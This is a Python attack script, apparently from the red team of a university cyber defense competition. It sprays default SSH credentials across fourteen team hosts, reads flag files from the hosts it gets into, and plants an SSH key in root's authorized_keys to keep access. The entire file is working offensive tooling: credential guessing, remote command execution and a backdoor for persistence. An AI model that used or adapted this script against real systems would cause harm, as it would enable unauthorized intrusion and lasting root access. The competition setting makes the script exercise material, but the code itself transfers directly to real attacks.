#!/usr/bin/python

import os
import sys
import paramiko

# list of users and passwords to try
# these are current "default" creds, per scenario document
userList = [ [ "root", "cdc" ], ["cdc", "cdc"] ]

# list of target computers and flag locations
# update to match scenario document
machines = [ ["www", "/etc/*flag"], ["files", "/root/*flag*"], ["lc", "/root/*flag*"] ]

# list of active teams
teamList = [1,2,3,4,5,6,7,8,9,10,11,12,13,14]

paramiko.util.log_to_file("demo_simple.log", level = "INFO")
#paramiko.client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)
#sshClient = paramiko.client.SSHClient()

def parseName(machineName):
    name = machineName.split(".")
    print(name[0])
    return(name[0])

def captureFlag(machineName, machineIndex, sshclient):
    print("Finding flag")
    filename = machines[machineIndex][1]
    command = "cat " + filename
    print(command)
    ssh_stdin, ssh_stdout, ssh_stderr = sshclient.exec_command(command)
    print("Flag from " + machineName + ": ")
    print(ssh_stdout.readlines())

def putSSHKey(sshclient):
    print("Added SSH key")
    sftp = sshclient.open_sftp()
    keyFile = <ssh key>
    remoteFile = "/root/.ssh/newId.pub"
    put(keyFile,remoteFile)
    command = "cat /root/.ssh/newId.pub >> /root/.ssh/authorized_keys"
    ssh_stdin, ssh_stdout, ssh_stderr = sshclient.exec_command(command)
    print(ssh_stdout.readlines())
    command = "rm /root/.ssh/newId.pub"
    ssh_stdin, ssh_stdout, ssh_stderr = sshclient.exec_command(command)
    print(ssh_stdout.readlines())


def tryDefaultCreds(machineName, machineIndex):
    print("Trying to ssh to " + machineName)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())
    sshClient = client
    for userpw in userList:
        try:
            sshClient.connect(machineName, port=22, username=userpw[0], password=userpw[1], timeout=10)
            print("default creds worked for user " + userpw[0] + " password " + userpw[1])
            captureFlag(machineName,machineIndex, sshClient)
            putSSHKey(sshClient)
            sshClient.close()

        except paramiko.SSHException as e:
            print("connection failed")
            print(e)
            break
        finally:
            continue
    print()

def findMachines():
    for teamNumber in teamList:
        index = 0
        for machine in machines[:]:
            print("searching for "+ machine[0] + " in team" + str(teamNumber))
            machineName = machine[0] + ".team" + str(teamNumber) + ".isucdc.com"
            print (machineName)
            tryDefaultCreds(machineName, index)

            index += 1




def main():
    print("Running 2024 ISU2 autopwn script\n")
    findMachines()


if __name__ == '__main__':
    main()
